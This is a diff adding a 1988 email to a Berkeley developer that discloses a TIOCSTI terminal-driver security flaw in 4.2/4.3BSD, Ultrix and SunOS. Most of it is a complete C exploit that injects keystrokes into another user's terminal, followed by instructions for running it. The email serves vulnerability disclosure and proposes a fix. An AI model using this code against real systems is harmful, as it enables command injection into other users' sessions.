@@ -1,0 +1,141 @@
+From vic@fine.Princeton.EDU Tue Nov 22 08:11:01 1988
+To: bostic@ucbarpa.Berkeley.EDU
+Subject: TIOCSTI bug.  (DETAILS)
+Organization: Mathematics Dept., Princeton Univ.
+Date: Mon, 21 Nov 88 15:58:48 EST
+From: Victor Duchovni <vic@fine.Princeton.EDU>
+Sender: vic@fine.Princeton.EDU
+Index: sys 4.3BSD
+
+	There is security bug in the design of the TIOCSTI ioctl
+in *all* BSD derived terminal drivers.  The restriction of the device
+being the control terminal + open for reading ( + pgrp restr of any kind ),
+is not strong enough.
+
+	The code below can be used to breach security under 4.2/4.3BSD,
+Ultrix 2.0,  SUN-OS 3.x and 4.0.
+
+	The cure ought to be in being much more restrictive in allocating
+control terminals.
+
+	THE CODE:
+	---------
+
+--------------------------------Cut------------------------------------
+#include <errno.h>
+#include <signal.h>
+#include <stdio.h>
+#include <sys/ioctl.h> 
+#include <fcntl.h>
+#include <sgtty.h>
+
+static struct sgttyb sgttyb ;
+
+main(argc,argv)
+char **argv;
+{
+	int i , p[2], pid ;
+	int pg ;
+	char c ;
+
+	/* Cbreak mode on stdin */
+	if ( isatty(0) ) {
+		ioctl(0,TIOCGETP,&sgttyb) ;
+		sgttyb.sg_flags |= CBREAK ;
+		ioctl(0,TIOCSETP,&sgttyb) ;
+	}
+
+	/* Open a pipe for parent/child i/o */
+
+	if ( pipe(p) == -1 ) {
+		perror(argv[0]);
+		exit(1) ;
+	}
+
+	/* fork, parent reads kbd,  child generates input
+	on argv[1], assumed a terminal device */
+
+	if ( (pid = fork()) == -1 ) exit(1) ;
+	if ( pid == 0 ) {
+		pid=getpid() ;
+		close(p[1]) ;
+		(*signal)(SIGTTIN,SIG_IGN) ;
+		(*signal)(SIGHUP,SIG_IGN) ;
+		(*signal)(SIGINT,SIG_IGN) ;
+		(*signal)(SIGTSTP,SIG_IGN) ;
+		for (i=0; i<3 ; i++) close(i) ;
+
+		/* NOTTY */
+		open("/dev/tty",O_RDWR) ;
+		ioctl(0,TIOCNOTTY,0) ;
+
+		/* make argv[1] control terminal & close it
+		 * NB.  EITHER read OR write access will do */
+
+		if ( open(argv[1],O_RDONLY) < 0 )
+		if ( open(argv[1],O_WRONLY) < 0 )
+			exit(1) ;
+		if ( ! isatty(1) )
+			exit(1) ;
+
+		close(1) ;
+
+		/* Dup "/dev/tty" onto stdout */
+		dup(0) ;
+
+		/* Main loop , read char from parent, TIOCSTI on fd 1 */
+
+		while( read(p[0],&c,1) == 1 ) {
+			ioctl(0,TIOCGPGRP,&pg) ;
+			setpgrp(pid,pg) ;
+			if ( ioctl(1,TIOCSTI,&c) < 0 ) {
+
+				/* If line hangs up,  FREAD is turned off
+				 * And we get EBADF on the request 
+				 * Just reopen "/dev/tty" and retry
+				 */
+
+				if ( errno == EBADF ) {
+					close(1) ;
+					open("/dev/tty",O_RDWR) ;
+					if ( ioctl(1,TIOCSTI,&c) < 0 ) {
+						/* give up */
+						exit(1) ;
+					}
+				} else {
+						exit(1) ;
+				}
+			}
+		}
+		close(p[0]) ;
+	}
+	else {
+		close(p[0]) ;
+		while((i=getchar()) != EOF ) {
+			c= i & 0xff ;
+			if ( write(p[1],&c,1) != 1 )
+				break;
+		}
+		close(p[1]) ;
+		if ( isatty(0) ) {
+			sgttyb.sg_flags &= ~CBREAK ;
+			ioctl(0,TIOCSETP,&sgttyb) ;
+		}
+	}
+	exit(0) ;
+}
+--------------------------------Cut------------------------------------
+
+	Just compile the above and run:
+
+a.out /dev/tty<something_or_other>
+...Your input....
+^C
+
+all input will be read by any process running on the target tty.
+I hope this will help to plug the hole.
+-- 
+	Victor Duchovni <vic@fine.princeton.edu>  : ARPA
+			<princeton!fine!vic>      : UUCP
+		(609)-452-5792			  : VOICE
+
